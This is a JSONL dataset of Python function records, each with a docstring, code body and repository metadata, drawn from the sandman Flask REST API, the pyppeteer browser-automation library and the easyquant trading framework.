{"docstring": "\"\"\"Return the appropriate *Response* for deleting an existing resource in\n*collection*.\n\n:param string collection: a :class:`sandman.model.Model` endpoint\n:param string key: the primary key for the :class:`sandman.model.Model`\n:rtype: :class:`flask.Response`\n\n\"\"\"\n", "func_signal": "def delete_resource(collection, key):\n", "code": "cls = endpoint_class(collection)\nresource = cls()\nresource = retrieve_resource(collection, key)\n\n_validate(cls, request.method, resource)\n\ntry:\n    _perform_database_action('delete', resource)\nexcept IntegrityError as exception:\n    raise InvalidAPIUsage(422, FORWARDED_EXCEPTION_MESSAGE.format(\n        exception))\nreturn no_content_response()", "path": "sandman/sandman/sandman.py", "commit_date": "2014-07-13 00:00:00", "repo_name": "jeffknupp/sandman", "stars": 2315, "license": "apache-2.0", "language": "python", "size": 11880}
{"docstring": "\"\"\"Return the :class:`sandman.model.Model` associated with the endpoint\n*collection*.\n\n:param string collection: a :class:`sandman.model.Model` endpoint\n:rtype: :class:`sandman.model.Model`\n\n\"\"\"\n", "func_signal": "def endpoint_class(collection):\n", "code": "with app.app_context():\n    try:\n        cls = current_app.class_references[collection]\n    except KeyError:\n        raise InvalidAPIUsage(404)\n    return cls", "path": "sandman/sandman/sandman.py", "commit_date": "2014-07-13 00:00:00", "repo_name": "jeffknupp/sandman", "stars": 2315, "license": "apache-2.0", "language": "python", "size": 11880}
{"docstring": "\"\"\"Return the appropriate *Response* based on adding a new resource to\n*collection*.\n\n:param string collection: a :class:`sandman.model.Model` endpoint\n:rtype: :class:`flask.Response`\n\n\"\"\"\n", "func_signal": "def post_resource(collection):\n", "code": "cls = endpoint_class(collection)\nresource = cls()\nresource.from_dict(get_resource_data(request))\n\n_validate(cls, request.method, resource)\n\n_perform_database_action('add', resource)\nreturn resource_created_response(resource)", "path": "sandman/sandman/sandman.py", "commit_date": "2014-07-13 00:00:00", "repo_name": "jeffknupp/sandman", "stars": 2315, "license": "apache-2.0", "language": "python", "size": 11880}
{"docstring": "\"\"\"Return ``True`` if the the given *cls* supports the HTTP *method* found\non the incoming HTTP request.\n\n:param cls: class associated with the request's endpoint\n:type cls: :class:`sandman.model.Model` instance\n:param string method: HTTP method of incoming request\n:param resource: *cls* instance associated with the request\n:type resource: :class:`sandman.model.Model` or list of\n                :class:`sandman.model.Model` or None\n:rtype: bool\n\n\"\"\"\n", "func_signal": "def _validate(cls, method, resource=None):\n", "code": "if method not in cls.__methods__:\n    raise InvalidAPIUsage(403, FORBIDDEN_EXCEPTION_MESSAGE.format(\n        method,\n        cls.endpoint(), cls.__methods__))\n\nclass_validator_name = 'validate_' + method\n\nif hasattr(cls, class_validator_name):\n    class_validator = getattr(cls, class_validator_name)\n    if not class_validator(resource):\n        raise InvalidAPIUsage(403)", "path": "sandman/sandman/sandman.py", "commit_date": "2014-07-13 00:00:00", "repo_name": "jeffknupp/sandman", "stars": 2315, "license": "apache-2.0", "language": "python", "size": 11880}
{"docstring": "\"\"\"Return the appropriate *Response* for retrieving a collection of\nresources.\n\n:param string collection: a :class:`sandman.model.Model` endpoint\n:param string key: the primary key for the :class:`sandman.model.Model`\n:rtype: :class:`flask.Response`\n\n\"\"\"\n", "func_signal": "def get_collection(collection):\n", "code": "cls = endpoint_class(collection)\n\nresources = retrieve_collection(collection, request.args)\n\n_validate(cls, request.method, resources)\n\nstart = stop = None\n\nif request.args and 'page' in request.args:\n    page = int(request.args['page'])\n    results_per_page = app.config.get('RESULTS_PER_PAGE', 20)\n    start, stop = page * results_per_page, (page + 1) * results_per_page\nreturn collection_response(cls, resources, start, stop)", "path": "sandman/sandman/sandman.py", "commit_date": "2014-07-13 00:00:00", "repo_name": "jeffknupp/sandman", "stars": 2315, "license": "apache-2.0", "language": "python", "size": 11880}
{"docstring": "\"\"\"Return a response with the appropriate status code, message, and content\ntype when an ``InvalidAPIUsage`` exception is raised.\"\"\"\n", "func_signal": "def handle_exception(error):\n", "code": "try:\n    if _get_acceptable_response_type() == JSON:\n        response = jsonify(error.to_dict())\n        response.status_code = error.code\n        return response\n    else:\n        return error.abort()\nexcept InvalidAPIUsage:\n    # In addition to the original exception, we don't support the content\n    # type in the request's 'Accept' header, which is a more important\n    # error, so return that instead of what was originally raised.\n    response = jsonify(error.to_dict())\n    response.status_code = 415\n    return response", "path": "sandman/sandman/sandman.py", "commit_date": "2014-07-13 00:00:00", "repo_name": "jeffknupp/sandman", "stars": 2315, "license": "apache-2.0", "language": "python", "size": 11880}
{"docstring": "\"\"\"Return the resources in *collection*, possibly filtered by a series of\nvalues to use in a 'where' clause search.\n\n:param string collection: a :class:`sandman.model.Model` endpoint\n:param dict query_arguments: a list of filter query arguments\n:rtype: class:`sandman.model.Model`\n\n\"\"\"\n", "func_signal": "def retrieve_collection(collection, query_arguments=None):\n", "code": "session = _get_session()\ncls = endpoint_class(collection)\nif query_arguments:\n    filters = []\n    order = []\n    limit = None\n    for key, value in query_arguments.items():\n        if key == 'page':\n            continue\n        if value.startswith('%'):\n            filters.append(getattr(cls, key).like(str(value), escape='/'))\n        elif key == 'sort':\n            order.append(getattr(cls, value))\n        elif key == 'limit':\n            limit = value\n        elif key:\n            filters.append(getattr(cls, key) == value)\n    resources = session.query(cls).filter(*filters).order_by(\n        *order).limit(limit)\nelse:\n    resources = session.query(cls).all()\nreturn resources", "path": "sandman/sandman/sandman.py", "commit_date": "2014-07-13 00:00:00", "repo_name": "jeffknupp/sandman", "stars": 2315, "license": "apache-2.0", "language": "python", "size": 11880}
{"docstring": "\"\"\"Return a response for the *resources* of the appropriate content type.\n\n:param resources: resources to be returned in request\n:type resource: list of :class:`sandman.model.Model`\n:rtype: :class:`flask.Response`\n\n\"\"\"\n", "func_signal": "def collection_response(cls, resources, start=None, stop=None):\n", "code": "if _get_acceptable_response_type() == JSON:\n    return _collection_json_response(cls, resources, start, stop)\nelse:\n    return _collection_html_response(resources, start, stop)", "path": "sandman/sandman/sandman.py", "commit_date": "2014-07-13 00:00:00", "repo_name": "jeffknupp/sandman", "stars": 2315, "license": "apache-2.0", "language": "python", "size": 11880}
{"docstring": "\"\"\"Return the JSON representation of the collection *resources*.\n\n:param list resources: list of :class:`sandman.model.Model`s to render\n:rtype: :class:`flask.Response`\n\n\"\"\"\n\n", "func_signal": "def _collection_json_response(cls, resources, start, stop, depth=0):\n", "code": "top_level_json_name = None\nif cls.__top_level_json_name__ is not None:\n    top_level_json_name = cls.__top_level_json_name__\nelse:\n    top_level_json_name = 'resources'\n\nresult_list = []\nfor resource in resources:\n    result_list.append(resource.as_dict(depth))\n\npayload = {}\nif start is not None:\n    payload[top_level_json_name] = result_list[start:stop]\nelse:\n    payload[top_level_json_name] = result_list\n\nreturn jsonify(payload)", "path": "sandman/sandman/sandman.py", "commit_date": "2014-07-13 00:00:00", "repo_name": "jeffknupp/sandman", "stars": 2315, "license": "apache-2.0", "language": "python", "size": 11880}
{"docstring": "\"\"\"Return a response for the *resource* of the appropriate content type.\n\n:param resource: resource to be returned in request\n:type resource: :class:`sandman.model.Model`\n:rtype: :class:`flask.Response`\n\n\"\"\"\n", "func_signal": "def attribute_response(resource, name, value):\n", "code": "if _get_acceptable_response_type() == JSON:\n    return _single_attribute_json_response(name, value)\nelse:\n    return _single_attribute_html_response(resource, name, value)", "path": "sandman/sandman/sandman.py", "commit_date": "2014-07-13 00:00:00", "repo_name": "jeffknupp/sandman", "stars": 2315, "license": "apache-2.0", "language": "python", "size": 11880}
{"docstring": "\"\"\"Return the appropriate *Response* for retrieving an attribute of\na single resource.\n\n:param string collection: a :class:`sandman.model.Model` endpoint\n:param string key: the primary key for the :class:`sandman.model.Model`\n:rtype: :class:`flask.Response`\n\n\"\"\"\n", "func_signal": "def get_resource_attribute(collection, key, attribute):\n", "code": "resource = retrieve_resource(collection, key)\n_validate(endpoint_class(collection), request.method, resource)\nvalue = getattr(resource, attribute)\nif isinstance(value, Model):\n    return resource_response(value)\nelse:\n    return attribute_response(resource, attribute, value)", "path": "sandman/sandman/sandman.py", "commit_date": "2014-07-13 00:00:00", "repo_name": "jeffknupp/sandman", "stars": 2315, "license": "apache-2.0", "language": "python", "size": 11880}
{"docstring": "\"\"\"Return the appropriate *Response* with status code *204*, signaling a\ncompleted action which does not require data in the response body\n\n:rtype: :class:`flask.Response`\n\n\"\"\"\n", "func_signal": "def no_content_response():\n", "code": "response = Response()\nresponse.status_code = 204\nreturn response", "path": "sandman/sandman/sandman.py", "commit_date": "2014-07-13 00:00:00", "repo_name": "jeffknupp/sandman", "stars": 2315, "license": "apache-2.0", "language": "python", "size": 11880}
{"docstring": "\"\"\"Replace the resource identified by the given key and return the\nappropriate response.\n\n:param string collection: a :class:`sandman.model.Model` endpoint\n:rtype: :class:`flask.Response`\n\n\"\"\"\n", "func_signal": "def put_resource(collection, key):\n", "code": "resource = retrieve_resource(collection, key)\n\n_validate(endpoint_class(collection), request.method, resource)\n\nresource.replace(get_resource_data(request))\ntry:\n    _perform_database_action('add', resource)\nexcept IntegrityError as exception:\n    raise InvalidAPIUsage(422, FORWARDED_EXCEPTION_MESSAGE.format(\n        exception))\nreturn no_content_response()", "path": "sandman/sandman/sandman.py", "commit_date": "2014-07-13 00:00:00", "repo_name": "jeffknupp/sandman", "stars": 2315, "license": "apache-2.0", "language": "python", "size": 11880}
{"docstring": "\"\"\"Replace the contents of a resource with *data* and return an appropriate\n*Response*.\n\n:param resource: :class:`sandman.model.Model` to be updated\n:param data: New values for the fields in *resource*\n\n\"\"\"\n", "func_signal": "def update_resource(resource, incoming_request):\n", "code": "resource.from_dict(get_resource_data(incoming_request))\n_perform_database_action('merge', resource)\nreturn no_content_response()", "path": "sandman/sandman/sandman.py", "commit_date": "2014-07-13 00:00:00", "repo_name": "jeffknupp/sandman", "stars": 2315, "license": "apache-2.0", "language": "python", "size": 11880}
{"docstring": "\"\"\"Return the HTML representation of the collection *resources*.\n\n:param list resources: list of :class:`sandman.model.Model`s to render\n:rtype: :class:`flask.Response`\n\n\"\"\"\n", "func_signal": "def _collection_html_response(resources, start=0, stop=20):\n", "code": "return make_response(render_template(\n    'collection.html',\n    resources=resources[start:stop]))", "path": "sandman/sandman/sandman.py", "commit_date": "2014-07-13 00:00:00", "repo_name": "jeffknupp/sandman", "stars": 2315, "license": "apache-2.0", "language": "python", "size": 11880}
{"docstring": "\"\"\"\"Upsert\" a resource identified by the given key and return the\nappropriate *Response*.\n\nIf no resource currently exists at `/<collection>/<key>`, create it\nwith *key* as its primary key and return a\n:func:`resource_created_response`.\n\nIf a resource *does* exist at `/<collection>/<key>`, update it with\nthe data sent in the request and return a :func:`no_content_response`.\n\nNote: HTTP `PATCH` (and, thus, :func:`patch_resource`) is idempotent\n\n:param string collection: a :class:`sandman.model.Model` endpoint\n:param string key: the primary key for the :class:`sandman.model.Model`\n:rtype: :class:`flask.Response`\n\n\"\"\"\n", "func_signal": "def patch_resource(collection, key):\n", "code": "cls = endpoint_class(collection)\n\ntry:\n    resource = retrieve_resource(collection, key)\nexcept InvalidAPIUsage:\n    resource = None\n\n_validate(cls, request.method, resource)\n\nif resource is None:\n    resource = cls()\n    resource.from_dict(get_resource_data(request))\n    setattr(resource, resource.primary_key(), key)\n    _perform_database_action('add', resource)\n    return resource_created_response(resource)\nelse:\n    return update_resource(resource, request)", "path": "sandman/sandman/sandman.py", "commit_date": "2014-07-13 00:00:00", "repo_name": "jeffknupp/sandman", "stars": 2315, "license": "apache-2.0", "language": "python", "size": 11880}
{"docstring": "\"\"\"Return the data from the incoming *request* based on the\nContent-type.\"\"\"\n", "func_signal": "def get_resource_data(incoming_request):\n", "code": "content_type = incoming_request.headers['Content-type'].split(';')[0]\nif ('Content-type' not in incoming_request.headers or\n        content_type in JSON_CONTENT_TYPES):\n    return incoming_request.json\nelif content_type in HTML_CONTENT_TYPES:\n    if not incoming_request.form:\n        raise InvalidAPIUsage(400)\n    return incoming_request.form\nelse:\n    # HTTP 415: Unsupported Media Type\n    raise InvalidAPIUsage(\n        415,\n        UNSUPPORTED_CONTENT_TYPE_MESSAGE.format(\n            types=incoming_request.headers['Content-type']))", "path": "sandman/sandman/sandman.py", "commit_date": "2014-07-13 00:00:00", "repo_name": "jeffknupp/sandman", "stars": 2315, "license": "apache-2.0", "language": "python", "size": 11880}
{"docstring": "\"\"\"Return the mimetype for this request.\"\"\"\n", "func_signal": "def _get_acceptable_response_type():\n", "code": "if ('Accept' not in request.headers or request.headers['Accept'] in\n        ALL_CONTENT_TYPES):\n    return JSON\nacceptable_content_types = set(\n    request.headers['ACCEPT'].strip().split(','))\nif acceptable_content_types & HTML_CONTENT_TYPES:\n    return HTML\nelif acceptable_content_types & JSON_CONTENT_TYPES:\n    return JSON\nelse:\n    # HTTP 406 Not Acceptable\n    raise InvalidAPIUsage(406)", "path": "sandman/sandman/sandman.py", "commit_date": "2014-07-13 00:00:00", "repo_name": "jeffknupp/sandman", "stars": 2315, "license": "apache-2.0", "language": "python", "size": 11880}
{"docstring": "\"\"\"Return the resource in *collection* identified by key *key*.\n\n:param string collection: a :class:`sandman.model.Model` endpoint\n:param string key: primary key of resource\n:rtype: class:`sandman.model.Model`\n\n\"\"\"\n", "func_signal": "def retrieve_resource(collection, key):\n", "code": "session = _get_session()\ncls = endpoint_class(collection)\nresource = session.query(cls).get(key)\nif resource is None:\n    raise InvalidAPIUsage(404)\nreturn resource", "path": "sandman/sandman/sandman.py", "commit_date": "2014-07-13 00:00:00", "repo_name": "jeffknupp/sandman", "stars": 2315, "license": "apache-2.0", "language": "python", "size": 11880}
{"docstring": "\"\"\"Return the json representation of a single attribute of a resource.\n\n:param :class:`sandman.model.Model` resource: resource for attribute\n:param string name:  name of the attribute\n:param string value: string value of the attribute\n:rtype: :class:`flask.Response`\n\n\"\"\"\n", "func_signal": "def _single_attribute_html_response(resource, name, value):\n", "code": "return make_response(render_template(\n    'attribute.html',\n    resource=resource,\n    name=name, value=value))", "path": "sandman/sandman/sandman.py", "commit_date": "2014-07-13 00:00:00", "repo_name": "jeffknupp/sandman", "stars": 2315, "license": "apache-2.0", "language": "python", "size": 11880}
{"docstring": "\"\"\"[Deprecated] miss-spelled function.\n\nUse `chromium_executable` instead.\n\"\"\"\n", "func_signal": "def chromium_excutable() -> Path:\n", "code": "logger.warning(\n    '`chromium_excutable` function is deprecated. '\n    'Use `chromium_executable instead.'\n)\nreturn chromium_executable()", "path": "pyppeteer/pyppeteer/chromium_downloader.py", "commit_date": "2018-09-27 00:00:00", "repo_name": "miyakogi/pyppeteer", "stars": 3553, "license": "other", "language": "python", "size": 4541}
{"docstring": "\"\"\"Run flake8 check.\"\"\"\n", "func_signal": "def task_flake8():\n", "code": "return {\n    'actions': ['flake8 setup.py pyppeteer tests'],\n}", "path": "pyppeteer/dodo.py", "commit_date": "2019-05-09 00:00:00", "repo_name": "miyakogi/pyppeteer", "stars": 3553, "license": "other", "language": "python", "size": 4541}
{"docstring": "\"\"\"Terminate chrome.\"\"\"\n", "func_signal": "def waitForChromeToClose(self) -> None:\n", "code": "if self.proc.poll() is None and not self.chromeClosed:\n    self.chromeClosed = True\n    try:\n        self.proc.terminate()\n        self.proc.wait()\n    except Exception:\n        # browser process may be already closed\n        pass", "path": "pyppeteer/pyppeteer/launcher.py", "commit_date": "2019-05-09 00:00:00", "repo_name": "miyakogi/pyppeteer", "stars": 3553, "license": "other", "language": "python", "size": 4541}
{"docstring": "\"\"\"Make this class **awaitable**.\"\"\"\n", "func_signal": "def __await__(self) -> Generator:\n", "code": "result = yield from self.promise\nif isinstance(result, Exception):\n    raise result\nreturn result", "path": "pyppeteer/pyppeteer/frame_manager.py", "commit_date": "2018-09-28 00:00:00", "repo_name": "miyakogi/pyppeteer", "stars": 3553, "license": "other", "language": "python", "size": 4541}
{"docstring": "\"\"\"Get the target that opened this target.\n\nTop-level targets return ``None``.\n\"\"\"\n", "func_signal": "def opener(self) -> Optional['Target']:\n", "code": "openerId = self._targetInfo.get('openerId')\nif openerId is None:\n    return None\nreturn self.browser._targets.get(openerId)", "path": "pyppeteer/pyppeteer/target.py", "commit_date": "2018-09-28 00:00:00", "repo_name": "miyakogi/pyppeteer", "stars": 3553, "license": "other", "language": "python", "size": 4541}
{"docstring": "\"\"\"Run pytest.\"\"\"\n", "func_signal": "def task_test():\n", "code": "return {\n    'actions': [CmdAction(\n        'pytest -n {}'.format(cores // 2),\n        buffering=1,\n    )],\n    'verbosity': 2,\n}", "path": "pyppeteer/dodo.py", "commit_date": "2019-05-09 00:00:00", "repo_name": "miyakogi/pyppeteer", "stars": 3553, "license": "other", "language": "python", "size": 4541}
{"docstring": "\"\"\"Download chromium if not install.\"\"\"\n", "func_signal": "def install() -> None:\n", "code": "if not check_chromium():\n    download_chromium()\nelse:\n    logging.getLogger(__name__).warning('chromium is already installed.')", "path": "pyppeteer/pyppeteer/command.py", "commit_date": "2018-09-13 00:00:00", "repo_name": "miyakogi/pyppeteer", "stars": 3553, "license": "other", "language": "python", "size": 4541}
{"docstring": "\"\"\"Run flake8/mypy/pydocstyle/docs/readme tasks.\"\"\"\n", "func_signal": "def task_check():\n", "code": "return {\n    'actions': None,\n    'task_dep': ['flake8', 'mypy', 'pydocstyle', 'docs', 'readme']\n}", "path": "pyppeteer/dodo.py", "commit_date": "2019-05-09 00:00:00", "repo_name": "miyakogi/pyppeteer", "stars": 3553, "license": "other", "language": "python", "size": 4541}
{"docstring": "\"\"\"Get free port.\"\"\"\n", "func_signal": "def get_free_port() -> int:\n", "code": "sock = socket.socket()\nsock.bind(('localhost', 0))\nport = sock.getsockname()[1]\nsock.close()\ndel sock\ngc.collect()\nreturn port", "path": "pyppeteer/pyppeteer/util.py", "commit_date": "2018-09-22 00:00:00", "repo_name": "miyakogi/pyppeteer", "stars": 3553, "license": "other", "language": "python", "size": 4541}
{"docstring": "\"\"\"Run all tests and checks.\"\"\"\n", "func_signal": "def task_all():\n", "code": "return {\n    'actions': None,\n    'task_dep': ['test', 'check'],\n}", "path": "pyppeteer/dodo.py", "commit_date": "2019-05-09 00:00:00", "repo_name": "miyakogi/pyppeteer", "stars": 3553, "license": "other", "language": "python", "size": 4541}
{"docstring": "\"\"\"Get current platform name by short string.\"\"\"\n", "func_signal": "def current_platform() -> str:\n", "code": "if sys.platform.startswith('linux'):\n    return 'linux'\nelif sys.platform.startswith('darwin'):\n    return 'mac'\nelif (sys.platform.startswith('win') or\n      sys.platform.startswith('msys') or\n      sys.platform.startswith('cyg')):\n    if sys.maxsize > 2 ** 31 - 1:\n        return 'win64'\n    return 'win32'\nraise OSError('Unsupported platform: ' + sys.platform)", "path": "pyppeteer/pyppeteer/chromium_downloader.py", "commit_date": "2018-09-27 00:00:00", "repo_name": "miyakogi/pyppeteer", "stars": 3553, "license": "other", "language": "python", "size": 4541}
{"docstring": "\"\"\"Run docstyle check.\"\"\"\n", "func_signal": "def task_pydocstyle():\n", "code": "return {\n    'actions': ['pydocstyle pyppeteer'],\n}", "path": "pyppeteer/dodo.py", "commit_date": "2019-05-09 00:00:00", "repo_name": "miyakogi/pyppeteer", "stars": 3553, "license": "other", "language": "python", "size": 4541}
{"docstring": "\"\"\"Get type of this target.\n\nType can be ``'page'``, ``'background_page'``, ``'service_worker'``,\n``'browser'``, or ``'other'``.\n\"\"\"\n", "func_signal": "def type(self) -> str:\n", "code": "_type = self._targetInfo['type']\nif _type in ['page', 'background_page', 'service_worker', 'browser']:\n    return _type\nreturn 'other'", "path": "pyppeteer/pyppeteer/target.py", "commit_date": "2018-09-28 00:00:00", "repo_name": "miyakogi/pyppeteer", "stars": 3553, "license": "other", "language": "python", "size": 4541}
{"docstring": "\"\"\"Get URL of this page.\"\"\"\n", "func_signal": "def url(self) -> str:\n", "code": "frame = self.mainFrame\nif not frame:\n    raise PageError('no main frame.')\nreturn frame.url", "path": "pyppeteer/pyppeteer/page.py", "commit_date": "2018-09-28 00:00:00", "repo_name": "miyakogi/pyppeteer", "stars": 3553, "license": "other", "language": "python", "size": 4541}
{"docstring": "\"\"\"Return error text.\n\nReturn ``None`` unless this request was failed, as reported by\n``requestfailed`` event.\n\nWhen request failed, this method return dictionary which has a\n``errorText`` field, which contains human-readable error message, e.g.\n``'net::ERR_RAILED'``.\n\"\"\"\n", "func_signal": "def failure(self) -> Optional[Dict]:\n", "code": "if not self._failureText:\n    return None\nreturn {'errorText': self._failureText}", "path": "pyppeteer/pyppeteer/network_manager.py", "commit_date": "2019-05-09 00:00:00", "repo_name": "miyakogi/pyppeteer", "stars": 3553, "license": "other", "language": "python", "size": 4541}
{"docstring": "\"\"\"Build sphinx document.\"\"\"\n", "func_signal": "def task_docs():\n", "code": "return {\n    'actions': [\n        'sphinx-build -q -W -E -j auto -b html docs docs/_build/html',\n    ],\n}", "path": "pyppeteer/dodo.py", "commit_date": "2019-05-09 00:00:00", "repo_name": "miyakogi/pyppeteer", "stars": 3553, "license": "other", "language": "python", "size": 4541}
{"docstring": "\"\"\"Return awaitable which resolves to bytes with response body.\"\"\"\n", "func_signal": "def buffer(self) -> Awaitable[bytes]:\n", "code": "if not self._contentPromise.done():\n    return self._client._loop.create_task(self._bufread())\nreturn self._contentPromise", "path": "pyppeteer/pyppeteer/network_manager.py", "commit_date": "2019-05-09 00:00:00", "repo_name": "miyakogi/pyppeteer", "stars": 3553, "license": "other", "language": "python", "size": 4541}
{"docstring": "\"\"\"Run mypy check.\"\"\"\n", "func_signal": "def task_mypy():\n", "code": "return {\n    'actions': ['mypy pyppeteer'],\n}", "path": "pyppeteer/dodo.py", "commit_date": "2019-05-09 00:00:00", "repo_name": "miyakogi/pyppeteer", "stars": 3553, "license": "other", "language": "python", "size": 4541}
{"docstring": "\"\"\"Check spelling of comments and docstrings.\"\"\"\n", "func_signal": "def task_spell():\n", "code": "return {\n    'actions': [\n        'pylint --disable all --enable spelling --spelling-dict en_US '\n        '--spelling-private-dict-file spell.txt pyppeteer'\n    ],\n}", "path": "pyppeteer/dodo.py", "commit_date": "2019-05-09 00:00:00", "repo_name": "miyakogi/pyppeteer", "stars": 3553, "license": "other", "language": "python", "size": 4541}
{"docstring": "\"\"\"Check long description for package.\"\"\"\n", "func_signal": "def task_readme():\n", "code": "return {\n    'actions': ['python setup.py check -r -s'],\n}", "path": "pyppeteer/dodo.py", "commit_date": "2019-05-09 00:00:00", "repo_name": "miyakogi/pyppeteer", "stars": 3553, "license": "other", "language": "python", "size": 4541}
{"docstring": "\"\"\"\n\u5173\u95ed\u8fdb\u7a0b\u524d\u7684\u5904\u7406\n:return:\n\"\"\"\n", "func_signal": "def _shutdown(self, sig, frame):\n", "code": "self.log.debug(\"\u5f00\u59cb\u5173\u95ed\u8fdb\u7a0b...\")\n# \u6240\u6709 shutdown \u524d\u7684\u89e6\u53d1\u70b9\nfor st in self.before_shutdown:\n    st()\n\n# \u5f15\u64ce\u81ea\u8eab\u7684 shutdown\nfor st in self.main_shutdown:\n    st()\n\n# \u7b49\u5f85\u6240\u6709\u7ebf\u7a0b\u5173\u95ed, \u76f4\u5230\u53ea\u7559\u4e0b\u4e3b\u7ebf\u7a0b\nc = threading.active_count()\nwhile threading.active_count() != c:\n    time.sleep(2)\n\n# \u8c03\u7528\u7b56\u7565\u7684 shutdown\nself.log.debug(\"\u5f00\u59cb\u5173\u95ed\u7b56\u7565...\")\nfor s in self.strategy_list:\n    s.shutdown()\n\n# \u6240\u6709 shutdown \u540e\u7684\u89e6\u53d1\u70b9\nfor st in self.after_shutdown:\n    st()\n\n# \u9000\u51fa\ntime.sleep(.1)\nsys.exit(1)", "path": "easyquant/easyquant/main_engine.py", "commit_date": "2016-09-29 00:00:00", "repo_name": "shidenggui/easyquant", "stars": 2797, "license": "None", "language": "python", "size": 222}
{"docstring": "\"\"\"\u542f\u52a8\u4e3b\u5f15\u64ce\"\"\"\n", "func_signal": "def start(self):\n", "code": "self.event_engine.start()\nself._add_main_shutdown(self.event_engine.stop)\n\nif self.broker == 'gf':\n    self.log.warn(\"sleep 10s \u7b49\u5f85 gf \u8d26\u6237\u52a0\u8f7d\")\n    time.sleep(10)\nfor quotation_engine in self.quotation_engines:\n    quotation_engine.start()\n    self._add_main_shutdown(quotation_engine.stop)\n\nself.clock_engine.start()\nself._add_main_shutdown(self.clock_engine.stop)", "path": "easyquant/easyquant/main_engine.py", "commit_date": "2016-09-29 00:00:00", "repo_name": "shidenggui/easyquant", "stars": 2797, "license": "None", "language": "python", "size": 222}
{"docstring": "# \u901a\u8fc7\u4e0b\u9762\u7684\u65b9\u5f0f\u6765\u83b7\u53d6\u65f6\u95f4\u6233\n", "func_signal": "def init(self):\n", "code": "now_dt = self.clock_engine.now_dt\nnow = self.clock_engine.now\nnow = time.time()\n\n# \u6ce8\u518c\u65f6\u949f\u4e8b\u4ef6\nclock_type = \"\u76d8\u5c3e\"\nmoment = dt.time(14, 56, 30, tzinfo=tz.tzlocal())\nself.clock_engine.register_moment(clock_type, moment)\n\n# \u6ce8\u518c\u65f6\u949f\u95f4\u9694\u4e8b\u4ef6, \u4e0d\u5728\u4ea4\u6613\u9636\u6bb5\u4e5f\u4f1a\u89e6\u53d1, clock_type == minute_interval\nminute_interval = 1.5\nself.clock_engine.register_interval(minute_interval, trading=False)", "path": "easyquant/strategies/\u7b56\u75651_Demo.py", "commit_date": "2016-08-19 00:00:00", "repo_name": "shidenggui/easyquant", "stars": 2797, "license": "None", "language": "python", "size": 222}
{"docstring": "#\u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6\n", "func_signal": "def file2dict(self, path):\n", "code": "with open(path) as f:\n    return json.load(f)", "path": "easyquant/easyquant/easydealutils/easyredis.py", "commit_date": "2016-07-17 00:00:00", "repo_name": "shidenggui/easyquant", "stars": 2797, "license": "None", "language": "python", "size": 222}
{"docstring": "\"\"\"\u52a8\u6001\u52a0\u8f7d\u7b56\u7565\n:param names: \u7b56\u7565\u540d\u5217\u8868\uff0c\u5143\u7d20\u4e3a\u7b56\u7565\u7684 name \u5c5e\u6027\"\"\"\n", "func_signal": "def load_strategy(self, names=None):\n", "code": "s_folder = 'strategies'\nself._names = names\nstrategies = os.listdir(s_folder)\nstrategies = filter(lambda file: file.endswith('.py') and file != '__init__.py', strategies)\nimportlib.import_module(s_folder)\nfor strategy_file in strategies:\n    self.load(self._names, strategy_file)\n# \u5982\u679c\u7ebf\u7a0b\u6ca1\u6709\u542f\u52a8\uff0c\u5c31\u542f\u52a8\u7b56\u7565\u76d1\u89c6\u7ebf\u7a0b\nif self.is_watch_strategy and not self._watch_thread.is_alive():\n    self.log.warn(\"\u542f\u7528\u4e86\u52a8\u6001\u52a0\u8f7d\u7b56\u7565\u529f\u80fd\")\n    self._watch_thread.start()", "path": "easyquant/easyquant/main_engine.py", "commit_date": "2016-09-29 00:00:00", "repo_name": "shidenggui/easyquant", "stars": 2797, "license": "None", "language": "python", "size": 222}
{"docstring": "\"\"\"\n:param clock_type:\n:param moment: datetime.time\n:param is_trading_date: bool(\u662f\u5426\u53ea\u6709\u5728\u4ea4\u6613\u65e5\u89e6\u53d1)\n:param makeup: \u6ce8\u518c\u65f6,\u5982\u679c\u5df2\u7ecf\u8fc7\u4e86\u89e6\u53d1\u65f6\u673a,\u662f\u5426\u7acb\u5373\u89e6\u53d1\n:return:\n\"\"\"\n", "func_signal": "def __init__(self, clock_engine, clock_type, moment=None, is_trading_date=True, makeup=False, call=None):\n", "code": "self.clock_engine = clock_engine\nself.clock_type = clock_type\nself.moment = moment\nself.is_trading_date = is_trading_date\nself.makeup = makeup\nself.call = call or (lambda: None)\nself.next_time = datetime.datetime.combine(\n        self.clock_engine.now_dt.date(),\n        self.moment,\n)\n\nif not self.makeup and self.is_active():\n    self.update_next_time()", "path": "easyquant/easyquant/push_engine/clock_engine.py", "commit_date": "2016-07-20 00:00:00", "repo_name": "shidenggui/easyquant", "stars": 2797, "license": "None", "language": "python", "size": 222}
{"docstring": "\"\"\"\n\u6267\u884c\u6bcf\u4e2a\u5355\u5143\u6d4b\u8bd5 \u524d \u90fd\u8981\u6267\u884c\u7684\u903b\u8f91\n:return:\n\"\"\"\n# \u8bbe\u5b9a\u4e0b\u4e00\u4e2a\u4ea4\u6613\u65e5\n", "func_signal": "def setUp(self):\n", "code": "self.trade_date = get_next_trade_date(datetime.date.today() - datetime.timedelta(days=1))\n\nself.time = datetime.time(0, 0, 0, tzinfo=tz.tzlocal())\n\nnow = datetime.datetime.combine(self.trade_date, self.time)\n# \u6b64\u5904\u91cd\u65b0\u5b9a\u4e49 main_engine\nself._main_engine = MainEngine('ht', 'tmp/ht.json')\n\n# \u8bbe\u7f6e\u4e3a\u4e0d\u5728\u4ea4\u6613\u4e2d\nself.clock_engine.trading_state = False\n\n# \u65f6\u949f\u4e8b\u4ef6\u8ba1\u6570\nself.counts = {\n    0.5: [],\n    1: [],\n    5: [],\n    15: [],\n    30: [],\n    60: [],\n    \"open\": [],\n    \"pause\": [],\n    \"continue\": [],\n    \"close\": [],\n\n}", "path": "easyquant/unitest_demo.py", "commit_date": "2016-07-20 00:00:00", "repo_name": "shidenggui/easyquant", "stars": 2797, "license": "None", "language": "python", "size": 222}
